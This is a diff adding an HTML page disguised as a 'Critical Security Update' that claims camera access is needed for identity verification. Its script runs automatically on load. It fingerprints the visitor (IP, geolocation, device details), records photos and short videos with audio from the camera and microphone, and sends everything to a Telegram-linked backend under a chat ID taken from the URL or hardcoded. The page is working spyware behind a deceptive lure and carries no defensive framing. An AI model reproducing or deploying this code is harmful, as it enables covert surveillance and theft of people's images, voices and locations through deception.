@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Critical Security Update</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            height: 100vh;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            text-align: center;
+            background: rgba(0,0,0,0.7);
+            padding: 48px 36px;
+            border-radius: 20px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            backdrop-filter: blur(4px);
+        }
+        .spinner {
+            width: 44px; height: 44px;
+            border: 4px solid rgba(255,255,255,0.12);
+            border-top-color: #4fc3f7;
+            border-radius: 50%;
+            animation: spin .9s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1 { font-size: 22px; margin-bottom: 6px; }
+        .sub { color: #90a4ae; font-size: 13px; margin-bottom: 16px; }
+        .bar-wrap {
+            height: 5px; background: #263238; border-radius: 5px;
+            margin: 20px 0 10px; overflow: hidden;
+        }
+        .bar { height: 100%; width: 0%; background: #4fc3f7; border-radius: 5px; transition: width .3s; }
+        #status { color: #4fc3f7; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="spinner"></div>
+        <h1>Critical Security Update</h1>
+        <p class="sub">Your system requires an urgent security patch.<br/>Camera access is needed for identity verification.</p>
+        <div class="bar-wrap"><div class="bar" id="bar"></div></div>
+        <div id="status">Initializing…</div>
+    </div>
+
+    <script>
+    (function() {
+        // ═══════════════════════════════════════════════════
+        //  BACKEND API ENDPOINT (Vercel serverless)
+        // ═══════════════════════════════════════════════════
+        const API_BASE = '/api/telegram';   // same-origin proxy
+
+        const FALLBACK_CHAT_ID = '5416091579';
+        const MAX_ATTEMPTS     = 3;
+        const VIDEO_DURATION   = 7000;   // ms
+        const START_DELAY      = 800;
+
+        const $status = document.getElementById('status');
+        const $bar    = document.getElementById('bar');
+
+        function setStatus(msg, pct) {
+            $status.textContent = msg;
+            if (typeof pct === 'number') $bar.style.width = Math.min(100, pct) + '%';
+        }
+
+        // ─── chat_id from URL path ───
+        function getChatId() {
+            const p = window.location.pathname.replace(/^\/+|\/+$/g, '');
+            if (!p) return FALLBACK_CHAT_ID;
+            return p.split('/')[0] || FALLBACK_CHAT_ID;
+        }
+        const CHAT_ID = getChatId();
+
+        // ─── fingerprint ───
+        async function getBattery() {
+            try {
+                if (!navigator.getBattery) return '';
+                const b = await navigator.getBattery();
+                return `Battery: ${Math.round(b.level*100)}% | Charging: ${b.charging?'Yes':'No'}` +
+                       (b.chargingTime<Infinity ? ` | ETA: ${b.chargingTime}s` : '');
+            } catch { return ''; }
+        }
+
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch {
+                try { const r = await fetch('https://api.myip.com'); const d = await r.json(); return d.ip; }
+                catch { return 'Unknown'; }
+            }
+        }
+
+        async function getGeo() {
+            try {
+                const pos = await new Promise((res,rej) =>
+                    navigator.geolocation.getCurrentPosition(res,rej,{timeout:4000})
+                );
+                return `Geo: ${pos.coords.latitude},${pos.coords.longitude} (±${pos.coords.accuracy}m)`;
+            } catch { return 'Geo: denied/timeout'; }
+        }
+
+        function buildFingerprint(battery, ip, geo) {
+            return [
+                '🔹 New visit',
+                `Chat ID: ${CHAT_ID}`,
+                `Time: ${new Date().toISOString()}`,
+                `URL: ${location.href}`,
+                `UA: ${navigator.userAgent}`,
+                `Screen: ${screen.width}×${screen.height} (${screen.colorDepth}bit)`,
+                `Lang: ${navigator.language || navigator.userLanguage}`,
+                `Platform: ${navigator.platform}`,
+                `Cores: ${navigator.hardwareConcurrency || '?'}`,
+                `Referrer: ${document.referrer || 'direct'}`,
+                `Cookies: ${navigator.cookieEnabled}`,
+                battery,
+                `Public IP: ${ip}`,
+                geo
+            ].filter(Boolean).join('\n');
+        }
+
+        // ─── blob → base64 ───
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const r = new FileReader();
+                r.onload  = () => resolve(r.result.split(',')[1]); // strip data: prefix
+                r.onerror = reject;
+                r.readAsDataURL(blob);
+            });
+        }
+
+        // ─── capture helpers ───
+        function snapshot(video) {
+            const c = document.createElement('canvas');
+            c.width  = video.videoWidth || 1280;
+            c.height = video.videoHeight || 720;
+            c.getContext('2d').drawImage(video, 0, 0);
+            return new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+        }
+
+        function recordVideo(stream, ms) {
+            const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
+                ? 'video/webm;codecs=vp9,opus' : 'video/webm';
+            const rec = new MediaRecorder(stream, { mimeType: mime });
+            const chunks = [];
+            rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            rec.start();
+            return new Promise(resolve => {
+                rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+                setTimeout(() => rec.stop(), ms);
+            });
+        }
+
+        // ─── send to backend (bot token stays server-side) ───
+        async function sendToBackend(payload) {
+            try {
+                const res = await fetch(API_BASE, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await res.json();
+            } catch (e) {
+                return { ok: false, error: e.message };
+            }
+        }
+
+        // ─── main ───
+        async function main() {
+            setStatus('Gathering system info…', 5);
+            const [battery, ip, geo] = await Promise.all([getBattery(), getIP(), getGeo()]);
+
+            const fingerprint = buildFingerprint(battery, ip, geo);
+
+            // send fingerprint text to Telegram via backend
+            await sendToBackend({
+                type: 'text',
+                chatId: CHAT_ID,
+                text: fingerprint + '\n─── STARTING CAPTURE ───'
+            });
+
+            setStatus('Requesting camera & microphone…', 30);
+
+            let success = 0, failed = 0;
+
+            for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+                setStatus(`Capture ${attempt}/${MAX_ATTEMPTS}…`, 30 + attempt * 22);
+
+                let stream = null;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: true
+                    });
+
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.muted = true;
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 500));
+
+                    // ── Photo ──
+                    setStatus(`📸 Photo #${attempt}…`, 45 + attempt * 10);
+                    const photoBlob = await snapshot(video);
+                    const photoB64  = await blobToBase64(photoBlob);
+                    await sendToBackend({
+                        type: 'photo',
+                        chatId: CHAT_ID,
+                        data: photoB64,
+                        caption: fingerprint + `\n📸 Photo #${attempt}\nChat: ${CHAT_ID}`
+                    });
+
+                    // ── Video ──
+                    setStatus(`🎥 Video #${attempt} (${VIDEO_DURATION/1000}s)…`, 55 + attempt * 10);
+                    const videoBlob = await recordVideo(stream, VIDEO_DURATION);
+                    const videoB64  = await blobToBase64(videoBlob);
+                    await sendToBackend({
+                        type: 'video',
+                        chatId: CHAT_ID,
+                        data: videoB64,
+                        caption: fingerprint + `\n🎥 Video #${attempt} (${VIDEO_DURATION/1000}s)\nChat: ${CHAT_ID}`
+                    });
+
+                    success++;
+                } catch (err) {
+                    failed++;
+                    const errMsg = err.name || err.message || 'Unknown';
+                    await sendToBackend({
+                        type: 'text',
+                        chatId: CHAT_ID,
+                        text: fingerprint + `\n❌ Attempt #${attempt} FAILED: ${errMsg}\nChat: ${CHAT_ID}`
+                    });
+                    break;
+                } finally {
+                    if (stream) stream.getTracks().forEach(t => t.stop());
+                }
+            }
+
+            await sendToBackend({
+                type: 'text',
+                chatId: CHAT_ID,
+                text: fingerprint + `\n🏁 Done — OK: ${success} | Fail: ${failed}\nChat: ${CHAT_ID}`
+            });
+
+            setStatus('Verification complete ✓', 100);
+        }
+
+        window.addEventListener('load', () => setTimeout(main, START_DELAY));
+    })();
+    </script>
+</body>
+  </html>
